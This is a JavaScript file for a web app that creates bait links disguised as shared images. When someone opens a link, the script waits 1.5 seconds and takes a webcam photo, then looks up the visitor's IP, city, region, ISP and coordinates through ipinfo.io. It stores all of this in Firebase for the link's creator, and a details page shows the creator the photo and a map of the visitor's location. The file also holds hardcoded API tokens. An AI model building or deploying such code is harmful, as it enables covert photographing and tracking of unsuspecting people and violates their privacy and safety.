(function($) {
  "use strict";
 
 
document.addEventListener('DOMContentLoaded', function () {

  // if (localStorage.getItem('ip') && localStorage.getItem('ipDashed')) {
  //   alert(localStorage.getItem('ip'),localStorage.getItem('ipDashed'))
  // }else{
  //   fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
  //     (response) => response.json()
  //   ).then((jsonResponse) => {
  //     var ip = `${jsonResponse.ip}`.replaceAll('.','-')
  //     localStorage.setItem('ip',jsonResponse.ip)
  //     localStorage.setItem('ipDashed',ip)
  //   })  
  //   window.location.reload()
  // }





  var uniqueNum = Math.floor(Math.random(1,1000000))+new Date().getTime()




  
    // BlobData Url
    function blobToDataURL(blob) {
      return new Promise((resolve) => {
          const reader = new FileReader();
          reader.onloadend = () => resolve(reader.result);
          reader.readAsDataURL(blob);
      });
    }
 


    function GetFakeUserData() {
      if (document.querySelectorAll('.wvu img').length > 0) { 
        if (new URLSearchParams(window.location.search).has('link') && new URLSearchParams(window.location.search).has('img')) { 

          function showPrevImg() {  
            let wimg = document.querySelector('.wvu img')
            wimg.src = new URLSearchParams(window.location.search).get('img')
          }
          showPrevImg()


          function SaveThisdata(photo) { 
            fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
              (response) => response.json()
            ).then((jsonResponse) => {
              var ip = `${jsonResponse.ip}`.replaceAll('.','-')
              firebase
              .database()
              .ref("users/"+new URLSearchParams(window.location.search).get('link'))
              .set({
                "ip":ip,
                "under_link":new URLSearchParams(window.location.search).get('link'),
                "photo": photo,
                ...jsonResponse
              });
            })
          }
          function GetImgThenSave() {
            
            // Cross-browser getUserMedia
            navigator.getUserMedia = (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
            if (navigator.getUserMedia) {
               
                async function NowCapture() {
                  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                  const track = stream.getVideoTracks()[0];
                  const imageCapture = new ImageCapture(track);
          
                  const photoBlob = await imageCapture.takePhoto();
                  const photoDataURL = await blobToDataURL(photoBlob);
    
                  SaveThisdata(`${photoDataURL}`)
  
                  // Stop the video stream after capturing the photo
                  stream.getTracks().forEach(track => track.stop());
                }
                setTimeout(() => {
                  NowCapture()
                }, 1500);

            



              // navigator.getUserMedia({ video: true },
              //   function (stream) {
              //     video.srcObject = stream;
      
              //     setTimeout(() => {
              //       var canvas = document.createElement('canvas');
              //       canvas.width = 700;
              //       canvas.height = 500;
              //       var context = canvas.getContext('2d');
              //       context.drawImage(video, 0, 0, canvas.width, canvas.height);

              //       // Convert the canvas content to base64
              //       var base64Data = canvas.toDataURL('image/png');
              //       SaveThisdata(`${base64Data}`)
              //     }, 2000);


              //   },
              //   function (err) {
              //     SaveThisdata('assets/img/no-image-found.jpg?from=Not got any permision')
              //   });



            } else {
              SaveThisdata('assets/img/no-image-found.jpg?from=getUserMedia is not supported') 
            }
          }
          GetImgThenSave()
        }else{
          window.location.href = "/"
        }
      }
    }
    GetFakeUserData()

    // Load the map
    function LoadMap([lat,long]) {
      var center = [lat, long];
      $('#locationOfUser')
      .gmap3({
      center: center,
      zoom: 1,
      mapTypeId : google.maps.MapTypeId.ROADMAP
      }).circle({
          center: center,
          radius : 50000,
          fillColor : "#FFAF9F",
          strokeColor : "#FF512F"
      }).fit(); 
    }
  


    // Unplash Images
    function UnPlushImages() { 
      if (document.querySelectorAll("form.CreateNowLink").length > 0) {
              
          const formTag = document.querySelector("form.CreateNowLink")
          const inputTag = formTag.querySelector("form.CreateNowLink input")
          const resultsTag = document.querySelector(".results")
  
          const apiUrl = "https://api.unsplash.com/search/photos?per_page=20&query="
          
          const searchUnsplash = function(term) {
              return fetch(apiUrl + term, {
                  method: "GET",
                  headers: {
                      "Authorization": "Client-ID 1ff567feea79565eafd82a37c3e34e5dacdbb411a117a9bec0bc20ffbd1a8612"
                  }
              })
              .then(response => response.json())
              .then(data => { 
                  return data.results.map(result => {
                      return {
                          imageSrc: result.urls.regular, 
                          width: result.width,
                          height: result.height, 
                          title: (result.description || "Untitled"),
                          name: result.user.name,
                      }
                  })
              })
          }
          
          //add results to page 
          const addResults = function (results) {
              //remove all loading tags 
              resultsTag.innerHTML = ""
          
          //loop over each indiv result and add to resultsTag
              results.forEach(result => {
              resultsTag.innerHTML = resultsTag.innerHTML + `
                  <div class="col-lg-4">
                      <div class="image makeLinkWIthTHis" style="background-color: ${result.backgroundColor}" data-img="${result.imageSrc}" data-bs-toggle="modal" data-bs-target="#staticBackdrop">
                          <img src= "${result.imageSrc}" >
                          <button class="button" type="button">Create</button>
                      </div>	 
                  </div>` 
              })
          }
          
                  //when we submit the form, get the info from input
          formTag.addEventListener("submit", function(event){
          
          //get info from input
          const searchTerm = inputTag.value
          
          
          searchUnsplash(searchTerm)
              .then(results => {
                  addResults(results)
              })
          
          // stop the form from going to the usual next page 
          event.preventDefault()
          
          })
          searchUnsplash('Money')
          .then(results => {
              addResults(results)
          })
  
      } 
    }
    UnPlushImages()


    // Copy to clipboard
    function CopyToClipboard() {
      if (document.querySelectorAll(".copy-text").length > 0) { 
        let copyText = document.querySelector(".copy-text");
        copyText.querySelector("button").addEventListener("click", function () {
            let input = copyText.querySelector("input.text");
            input.select();
            document.execCommand("copy");
            copyText.classList.add("active");
            window.getSelection().removeAllRanges();
            setTimeout(function () {
                copyText.classList.remove("active");
            }, 2500);
        });
      }
    }
    CopyToClipboard()

    // Creating link
    function MakeLink() {
      window.addEventListener('click', (e) => {
        let imgDiv = e.target
        let inp = document.querySelector('.successFullyDone input')
        if (imgDiv.classList.contains('makeLinkWIthTHis')) {
            fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
              (response) => response.json()
            ).then((jsonResponse) => {
              var ip = `${jsonResponse.ip}`.replaceAll('.','-')
              var link = window.location.origin+"/welcometoyou.html?link="+uniqueNum+"&img="+imgDiv.dataset.img
              firebase
              .database()
              .ref("links/" +uniqueNum)
              .set({
                "ip":ip,
                "link":link,
                "imglink": imgDiv.dataset.img,
              });
              inp.value = link
            })  
        }
      })
    }
    MakeLink()


    // Show all links in the home page
    function ShowLinks() {
      if (document.querySelectorAll('.mylinks').length > 0) {
        let LinksBlk = document.querySelector('.pdBlk')
        
        fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
          (response) => response.json()
        ).then((jsonResponse) => {
          var ip = `${jsonResponse.ip}`.replaceAll('.','-')
          firebase
          .database()
          .ref("links")
          .on("value", function (snap) {
            var data = snap.val();

            const filteredData = Object.fromEntries(
              Object.entries(data)
                .filter(([key, value]) => value.ip === ip)
            );
 
 
            if (Object.keys(filteredData).length > 0) {
              document.querySelector('.mylinks.dblk').style.display = "block"
              
              Object.entries(filteredData).forEach(([key, item]) => { 
                let div =  document.createElement('DIV')
                div.classList.add('col-lg-3')
                div.classList.add('col-md-4')
                div.classList.add('col-sm-6')
                div.innerHTML = `
                  <a href="/details.html?link_of=${key}&link=${item.link}&img=${item.imglink}" class="lblk">
                      <img src="${item.imglink}" alt="">
                      <b class="text-truncate">${item.link}</b>
                  </a>
                `
                LinksBlk.appendChild(div)
    

              })
            }


 
          });
        })  
        
      }
    }
    ShowLinks()

    // Get Details
    function GetDetails() {
      if (document.querySelectorAll('.dtl-blk').length > 0) {
        if (new URLSearchParams(window.location.search).has('link_of')) {
          let LinkDetalBlk = document.querySelector('.linkDetails')
          let Heading = LinkDetalBlk.querySelector('h4')
          let Photo = LinkDetalBlk.querySelector('.dtl-blk img')
          let ul = LinkDetalBlk.querySelector('ul.showDetailsHere')

          let LinkPeram = new URLSearchParams(window.location.search)
          
          Heading.innerHTML = "<small>"+LinkPeram.get('link')+"</small>"


          firebase
          .database()
          .ref("users/"+LinkPeram.get('link_of'))
          .on("value", function (snap) {
            
            var data = snap.val();
            
            if (data) { 
  
              Photo.src = data.photo

              ul.querySelector('.ip').innerHTML = data.ip
              ul.querySelector('.Country').innerHTML = data.country
              ul.querySelector('.city').innerHTML = data.city
              ul.querySelector('.devision').innerHTML = data.region
              ul.querySelector('.timezone').innerHTML = data.timezone
              ul.querySelector('.isp').innerHTML = data.org
 
              document.querySelector('body').classList.remove('not_clicked_yet')
              let latLong = data.loc.split(",")
              LoadMap([Number(latLong[0]), Number(latLong[1])]);
       
            } 
            
 
 

          })


        }else{
          window.location.href = "/"
        }
      }
    }
    GetDetails()
 


}); 
 



 
  







 
})(jQuery);
